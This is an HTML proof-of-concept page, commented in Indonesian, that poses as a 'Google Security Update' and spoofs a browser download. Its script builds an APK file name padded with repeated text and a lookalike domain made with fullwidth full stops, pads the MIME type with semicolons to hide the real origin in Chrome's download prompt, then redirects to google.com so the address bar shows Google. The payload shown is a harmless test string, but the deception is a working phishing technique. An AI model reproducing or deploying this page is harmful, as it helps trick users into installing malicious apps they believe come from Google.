<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Security Update</title>
</head>
<body style="text-align:center; padding-top:50px; font-family: Arial;">
    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">
        UPDATE GOOGLE SERVICES
    </button>

<script>
    document.getElementById('pwnBtn').addEventListener('click', function() {
        // Taktik: Menggunakan Nama File yang sangat panjang untuk mendorong teks 'from' ke bawah
        // Karakter 'FULLWIDTH FULL STOP' (．) digunakan agar terlihat seperti titik domain
        const fakeDomain = "www．google．com";
        const fileName = "Update_" + "verification_".repeat(30) + fakeDomain + ".apk";
        
        // Taktik: Menggunakan MIME Type palsu yang sangat panjang
        // Chrome terkadang menampilkan MIME Type jika ia tidak mengenali ekstensinya dengan cepat
        const longMime = "application/octet-stream" + ";".repeat(200);

        const base64Data = "ZXN0dGVzdHRlc3Q=";
        
        // Kita gunakan skema data: langsung
        // Kita tidak menggunakan fragment (#) tapi langsung memasukkan domain ke dalam metadata
        const payload = `data:${longMime};base64,${base64Data}`;

        const a = document.createElement('a');
        a.href = payload;
        a.download = fileName;
        document.body.appendChild(a);
        
        a.click();

        // Redirect instan untuk mengubah context origin di address bar
        setTimeout(() => {
            window.location.replace("https://www.google.com");
        }, 300);
    });
</script>
</body>
</html>
